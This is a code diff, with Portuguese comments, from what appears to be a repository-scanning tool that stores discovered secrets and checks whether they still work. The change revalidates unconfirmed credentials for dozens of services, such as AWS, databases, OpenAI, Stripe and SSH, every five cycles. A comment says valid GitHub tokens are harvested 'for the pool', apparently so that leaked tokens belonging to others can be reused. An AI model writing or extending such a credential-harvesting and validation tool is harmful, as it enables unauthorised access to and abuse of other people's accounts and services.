@@ -269,8 +269,29 @@ async def run_forever_free():
             "repos_scanned": len(repos_seen), "duration_seconds": time.time() - start,
             "status": "running",
         })
-        if cycle_n % 10 == 0:
+        # A cada 5 ciclos: revalida pendentes (is_valid=NULL) que têm validador
+        if cycle_n % 5 == 0:
             import sqlite3 as _sqlite3
+            conn = _sqlite3.connect(store.DB_PATH)
+            conn.row_factory = _sqlite3.Row
+            # Busca secrets com is_valid=NULL (indefinidos) — podem ter ficado pendentes
+            rows = conn.execute("""
+                SELECT id, key_type, key_value, validator_type FROM secrets 
+                WHERE is_valid IS NULL 
+                AND key_type IN ('mongodb','postgresql','redis','mysql','aws','whatsapp',
+                                 'firebase','telegram','gcp','jwt','ssh','discord','slack',
+                                 'anthropic','gitlab','openai','huggingface','twilio','stripe',
+                                 'npm','docker','digitalocean','sendgrid','mailgun','sqlite',
+                                 'pix','elastic','cert','pgp')
+                ORDER BY key_type LIMIT 200
+            """).fetchall()
+            conn.close()
+            if rows:
+                print(f"  🔄 Revalidando {len(rows)} secrets indefinidos...")
+                for r in rows:
+                    val_queue.append((r["id"], r["validator_type"] or r["key_type"], r["key_value"]))
+                await drain_validation_queue()
+            # GitHub PATs: revalida pra colher tokens válidos pro pool
             conn = _sqlite3.connect(store.DB_PATH)
             conn.row_factory = _sqlite3.Row
             ghs = conn.execute("SELECT id, key_value FROM secrets WHERE key_type='github' AND (is_valid=0 OR is_valid IS NULL) LIMIT 50").fetchall()
